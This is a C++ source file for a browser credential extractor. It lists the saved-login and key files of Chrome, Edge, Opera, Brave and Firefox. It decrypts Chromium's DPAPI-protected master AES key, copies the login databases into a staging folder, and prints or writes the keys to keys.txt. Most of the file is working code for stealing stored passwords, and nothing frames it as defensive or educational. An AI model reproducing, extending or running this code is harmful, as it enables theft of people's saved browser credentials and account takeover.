#include "BrowserKeyExtract.h"
#include "base64.h"
#include <sys/stat.h>
#include <fstream>
#include <iomanip>
#include <filesystem>
#include <sstream>
#include <regex>
#include "utility.h"
#include <Windows.h>


/*				========================= Static Variables =========================				*/

const std::vector<std::string> Browser::relativePaths = {			// Relative Path to browser(s) data
	"/AppData/Local/Google/Chrome/User Data/Default/Login data",
	"/AppData/Local/Gogle/Chrome Beta/User Data/Default/Login data",
	"/AppData/Local/Chromium/User Data/Default/Login data",
	"/AppData/Local/Google/Chrome/User Data/Local State",
	"/AppData/Local/Google/Chrome Beta/User Data/Local State",
	"/AppData/Local/Chromium/User Data/Local State",
	"/AppData/Roaming/Opera Software/Opera Stable/Default/Login data",
	"/AppData/Roaming/Opera Software/Opera GX Stable/Default/Login data",
	"/AppData/Roaming/Opera Software/Opera Stable/Local State",
	"/AppData/Roaming/Opera Software/Opera GX Stable/Local State",
	"/AppData/Local/Microsoft/Edge/User Data/Default/Login data",
	"/AppData/Local/Microsoft/Edge/User Data/Local State",
	"/AppData/Roaming/Mozilla/Firefox/Profiles",
	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login data",
	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
};

const std::vector<std::string> Browser::impFiles = {	// List of important files to search/process [ Include all important files here ]
					"logins.json",
					"key4.db",
					"cert9.db",
					"cert8.db"
};

/*				========================= Private functions =========================				*/

std::string Browser::extractEncryptedKey(const std::string& jsonData)
{
	// Define the regex pattern to match the "encrypted_key" entry
	std::regex pattern("\\\"encrypted_key\\\"\\s*:\\s*\\\"([^\\\"]+)\\\"");
	std::smatch matches;

	// Search for the pattern in the jsonData string
	if (std::regex_search(jsonData, matches, pattern) && matches.size() > 1) {
		// Return the captured group (the value of "encrypted_key")
		return matches[1].str();
	}
	return "";
}

bool Browser::isImportantFile(const std::string& path) {

	if (path.empty()) {
		std::cerr << __FUNCTIONW__ << "(): path is empty" << std::endl;
	}
	for (auto& file : Browser::impFiles) {
		if (path.find(file) != std::string::npos) {
			return true;
		}
	}
	return false;
}

void Browser::populateKeyAndStateFiles(const std::vector<std::string>& path) {

	for (unsigned int i = 0; i < path.size(); ++i) {
		if (path[i].find("Login data") != std::string::npos) {
			LoginDataPath.push_back(path[i]);
		}
		else if (path[i].find("Local State") != std::string::npos) {
			EncryptedKeyPATH = path[i];
		}
	}
}

std::string Browser::getEncryptedMasterKey(void) {

	// EXTRACTION PROCESS STARTS FROM HERE
	std::string PathToKey = EncryptedKeyPATH;
	std::ifstream EncryptedKeyFile(PathToKey);
	std::string KeyFile;

	// Read the whole encrypted key file and store the content in "KeyFile"
	while (getline(EncryptedKeyFile, KeyFile));

	std::string bas64_encrypted_key{ extractEncryptedKey(KeyFile) };
	std::string decrypted_key{ base64_decode(bas64_encrypted_key) };

	// Remove the header string i.e. "DPAPI" from the string
	decrypted_key = decrypted_key.substr(strlen("DPAPI"), decrypted_key.length());
	return decrypted_key;
}

std::string Browser::decryptMasterKey(const std::string& encryptedKey) {

	DATA_BLOB DataIn;
	DATA_BLOB DataVerify;

	BYTE* pbDataInput = (BYTE*)encryptedKey.c_str();
	DWORD cbDataInput = encryptedKey.length() + 1;

	DataIn.pbData = pbDataInput;
	DataIn.cbData = cbDataInput;
	CRYPTPROTECT_PROMPTSTRUCT PromptStruct;
	LPWSTR pDescrOut = NULL;

	//  Initialize PromptStruct
	ZeroMemory(&PromptStruct, sizeof(PromptStruct));
	PromptStruct.cbSize = sizeof(PromptStruct);
	PromptStruct.dwPromptFlags = CRYPTPROTECT_PROMPT_ON_PROTECT;

	// This function does the decryption by using a session key that the function creates by using the user's logon credentials
	// Data Protection API (DPAPI MSDN) is called to Extract the AES Key which is used to encrypt the login passwords
	if (!CryptUnprotectData(&DataIn, &pDescrOut, NULL, NULL, NULL, 0, &DataVerify)) {
		std::cout << " Error generated by CryptUnprotectData()" << std::endl;
		return std::string();
	}
	unsigned char key[AES_KEY_SIZE_IN_BYTES + 1] = { };
	// Store the Extracted AES Key
	std::copy(&DataVerify.pbData[0], &DataVerify.pbData[AES_KEY_SIZE_IN_BYTES], key);
	return std::string(reinterpret_cast<char const*>(key), AES_KEY_SIZE_IN_BYTES);
}

/*				========================= Public functions =========================				*/

void Browser::ExtractKey(const std::vector<std::string> &path, const unsigned int &b64_key_length) {

	// Check whether the browser EXIST or NOT
	if (path.empty()) {
		return;
	}
	if (b64_key_length == 0) {
		std::cout << BrowserName << "Base64 key length cannot be 0" << std::endl;
		return;
	}
	if (BrowserName.empty()) {
		BrowserName = BrowserNameFinder(path[0]);
	}
	populateKeyAndStateFiles(path);
	std::string encryptedMasterKey =  getEncryptedMasterKey();
	std::string masterAESKey = decryptMasterKey(encryptedMasterKey);
	if (masterAESKey.empty()) {
		std::cerr << "Couldn't extract masterKey for " << BrowserName << std::endl;
		return;
	}
	std::copy(masterAESKey.begin(), masterAESKey.end(), AES_KEY);
}

void Browser::ExtractFiles(const std::vector<std::string> &paths, const std::string &destinationDir) {

	if (paths.empty()) {
		std::cout << "Corresponding browser is not available" << std::endl;
		return;
	}
	if (BrowserName.empty()) {
		BrowserName = BrowserNameFinder(paths[0]);
	}
	const std::string DesDirPath = destinationDir + "/" + BrowserName + "/";
	std::error_code error_code;
	
	// Create directory for the corresponding browser
	std::filesystem::create_directories(DesDirPath, error_code);
	if (error_code.value() != ERROR_SUCCESS) {
		std::cerr <<__FUNCTION__ <<  "(): " << error_code.message() << std::endl;
		return;
	}

	unsigned int append_num = 1;	// This is number is used when a file to be copy already exists, the program will place an integer infront of the new file
	std::string filename;
	std::vector<std::string> filesToBeCopied;

	for (const auto& SrcFile : paths) {

		if (BrowserName == "Firefox") {
			std::string DirPath = paths[0];

			for (const auto& dirEntry : std::filesystem::recursive_directory_iterator(DirPath, std::filesystem::directory_options::skip_permission_denied, error_code)) {
				const std::string path{ dirEntry.path().string() };
				if (isImportantFile(path)) {
					filesToBeCopied.push_back(path);
				}
			}
			for (const auto& filePath : filesToBeCopied) {
				filename = extractFileNameFromPath(filePath);
				std::filesystem::copy_file(filePath, DesDirPath + filename, error_code);
				if (error_code.value() == ERROR_FILE_EXISTS) {
					std::filesystem::copy_file(filePath, DesDirPath + filename + std::to_string(append_num++), error_code);
				}
			}
		}
		else if (SrcFile.find("Login data") != std::string::npos) {
			filename = extractFileNameFromPath(SrcFile);
			std::filesystem::copy_file(SrcFile, DesDirPath + filename, error_code);
			if (error_code.value() == ERROR_FILE_EXISTS) {
				std::filesystem::copy_file(SrcFile, DesDirPath + filename + std::to_string(append_num++), error_code);
			}
		}
	}
}

std::string Browser::BrowserNameFinder(const std::string path) {
	if (path.empty());
	else if ((path.find("Google") != std::string::npos) || (path.find("Chrome") != std::string::npos)) { BrowserName = "Google Chrome"; }
	else if (path.find("Edge") != std::string::npos) { BrowserName = "Microsoft Edge"; }
	else if (path.find("Opera") != std::string::npos) { BrowserName = "Opera"; }
	else if (path.find("Firefox") != std::string::npos) { BrowserName = "Firefox"; }
	else if (path.find("Brave") != std::string::npos) { BrowserName = "Brave"; }
	else { BrowserName = ""; }
	return BrowserName;
}

void Browser::ShowKey(void) {

	if (BrowserName.empty()) {
		std::cout << "This browser doesn't exist on the system" << std::endl;
		return;
	}
	// Before writing the AES key to file, check whether the AES_KEY is not empty
	if (AES_KEY[0] == 0x00) {
		std::cout << "Extract the AES key first" << std::endl;
		return;
	}
	for (int i = 0; i < AES_KEY_SIZE_IN_BYTES; i++) {
		std::cout << std::setw(2) << std::setfill('0') << std::hex << (int)AES_KEY[i];
	}
	std::cout << std::endl;
}

void Browser::WriteExtractedKeyToFile(const std::string& path) {

	if (path.empty()) {
		std::cerr << "Keys file path is empty" << std::endl;
	}
	std::error_code error_code;
	std::filesystem::create_directories(path, error_code);

	// Before writing the AES key to file, check whether the AES_KEY is not empty
	if (AES_KEY[0] == 0x00) {
		std::cout << "Extract the AES key first before writing it to a file" << std::endl;
		return;
	}

	std::ofstream file(path + "/" + std::string("keys.txt"), std::ofstream::out | std::ofstream::app);
	file << BrowserName << ":  ";
	for (int i = 0; i < AES_KEY_SIZE_IN_BYTES; i++) {
		file << std::setw(2) << std::setfill('0') << std::hex << (int)AES_KEY[i];
	}
	file << std::endl;
	file.close();
}